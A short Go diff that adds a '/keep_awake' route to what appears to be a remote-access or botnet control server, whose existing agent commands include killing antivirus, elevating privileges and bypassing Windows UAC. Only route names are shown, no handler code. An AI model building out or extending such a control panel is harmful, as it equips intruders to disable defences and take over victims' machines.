@@ -150,6 +150,7 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/download_url", s.handleDownloadURL)
 		agentCmd.POST("/uninstall", s.handleUninstall)
 		agentCmd.POST("/set_sleep", s.handleSetSleep)
+		agentCmd.POST("/keep_awake", s.handleKeepAwake)
 		agentCmd.POST("/kill_av", s.handleKillAV)
 		agentCmd.POST("/elevate", s.handleElevate)
 		agentCmd.POST("/uac_bypass", s.handleUACBypass)
